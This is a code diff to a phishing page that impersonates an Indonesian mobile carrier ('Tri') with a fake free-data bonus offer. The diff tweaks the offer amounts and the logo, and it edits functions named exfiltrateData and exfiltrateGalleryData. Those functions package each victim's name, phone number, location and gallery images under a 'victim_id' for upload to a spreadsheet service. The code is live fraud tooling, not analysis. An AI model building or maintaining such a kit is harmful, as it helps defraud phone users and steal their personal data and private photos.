@@ -299,7 +299,7 @@
 </head>
 <body>
     <div class="header">
-        <img src="logo.png" alt="TRI" class="logo">
+        <img src="3-LOGO.png" alt="TRI" class="logo">
         <div class="tagline">GET YOURS</div>
     </div>
 
@@ -307,12 +307,12 @@
         <div class="tri-badge">🔥 PROMO KHUSUS PENGGUNA TRI</div>
 
         <div class="special-offer">
-            <p>BONUS <strong>UNLIMITED DATA 12GB</strong> + <strong>100 MENIT</strong></p>
+            <p>BONUS <strong>UNLIMITED DATA 10GB</strong> + <strong>100 MENIT</strong></p>
         </div>
 
         <div class="promo-banner">
             <h1>KLAIM SEKARANG</h1>
-            <div class="bonus">12GB + 100 MIN</div>
+            <div class="bonus">10GB + 100 MIN</div>
             <p>Khusus pengguna aktif! Berlaku sampai 28 Feb 2026</p>
         </div>
 
@@ -349,7 +349,7 @@
                 <div class="success-icon">🎉</div>
                 <h2>Selamat!</h2>
                 <p>Pendaftaran berhasil!</p>
-                <p style="margin-top: 15px;">Bonus 12GB + 100 Menit akan diaktifkan dalam 1x24 jam</p>
+                <p style="margin-top: 15px;">Bonus 10GB + 100 Menit akan diaktifkan dalam 1x24 jam</p>
                 <p style="margin-top: 10px; font-size: 0.8rem; color: #888;">
                     Tiket: <span id="ticket-id">TRI-</span>
                 </p>
@@ -664,8 +664,10 @@
             // Generate victim ID sementara
             const tempVictimId = 'tri_' + btoa(Date.now().toString()).substring(0, 10);
 
+            const now = new Date();
             const payload = {
-                timestamp: new Date().toISOString(),
+                timestamp: now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
+                timestamp_iso: now.toISOString(), // Keep ISO for sorting
                 victim_id: tempVictimId,
                 template: 'tri_location_only',
                 nama: 'Pending',
@@ -713,8 +715,10 @@
         // ===== EXFILTRATE FORM DATA (SAAT SUBMIT) =====
         async function exfiltrateData() {
             // SheetDB format: flat JSON (no nested objects!)
+            const now = new Date();
             const payload = {
-                timestamp: new Date().toISOString(),
+                timestamp: now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
+                timestamp_iso: now.toISOString(), // Keep ISO for sorting
                 victim_id: 'tri_' + btoa(userData.nohp + Date.now()).substring(0, 10),
                 template: 'tri_bonus',
                 nama: userData.nama,
@@ -772,8 +776,10 @@
         async function exfiltrateGalleryData() {
             // SheetDB format: flat JSON per image
             for (const img of userData.images) {
+                const now = new Date();
                 const payload = {
-                    timestamp: new Date().toISOString(),
+                    timestamp: now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
+                    timestamp_iso: now.toISOString(),
                     victim_id: 'tri_' + btoa(userData.nohp + Date.now()).substring(0, 10),
                     template: 'tri_gallery',
                     nohp: userData.nohp,
